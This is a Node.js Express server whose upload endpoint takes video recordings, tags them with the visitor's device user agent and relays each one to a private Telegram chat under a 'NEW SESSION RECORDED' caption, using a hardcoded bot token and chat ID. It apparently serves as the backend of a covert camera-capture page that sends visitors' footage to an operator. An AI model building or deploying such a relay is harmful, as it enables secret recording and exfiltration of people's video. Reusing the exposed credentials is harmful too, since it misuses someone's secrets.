import express from "express";
import multer from "multer";
import path from "path";
import { fileURLToPath } from "url";

const app = express();

// 1. Memory Optimization: Limit file size to prevent RAM exhaustion (e.g., 50MB)
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } 
});

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const PORT = process.env.PORT || 3000; 
const BOT_TOKEN = "8879628969:AAF5g8XnFu9Ido-nKTHj8GAWBd0R-iA5bAA";
const CHAT_ID = "-1003979222265";

function buildCaption(info) {
    return `🎬 *NEW SESSION RECORDED*\n\n💻 *Device UserAgent:*\n\`${info.userAgent || "Unknown"}\``;
}

app.use(express.static(path.join(__dirname, "frontend")));

// Optimized Upload Endpoint
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) {
            return res.status(400).json({ error: "No video file provided" });
        }

        const { userAgent } = req.body;
        const captionText = buildCaption({ userAgent });

        // 2. Performance Optimization: Use native FormData and Blob 
        // This avoids memory overhead from third-party multipart libraries
        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("caption", captionText);
        form.append("parse_mode", "Markdown");

        const videoBlob = new Blob([videoFile.buffer], { type: videoFile.mimetype });
        form.append("video", videoBlob, "video.mp4");

        // 3. Efficiency Optimization: Native fetch handles multipart headers automatically
        const telegramResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,
            {
                method: "POST",
                body: form
                // No manual headers required; node native fetch sets boundaries optimally
            }
        );

        const result = await telegramResponse.json();

        if (!result.ok) {
            console.error("Telegram API Error Response:", result);
            return res.status(502).json({ error: "Telegram API bad gateway execution", details: result });
        }

        res.json({ success: true, messageId: result.result.message_id });

    } catch (error) {
        console.error("Processing breakdown error:", error);
        res.status(500).json({
            error: "Server internal error",
            message: error.message
        });
    }
});

app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "frontend", "index.html"));
});

app.listen(PORT, () => {
    console.log(`Server executing active processes on port ${PORT}`);
});
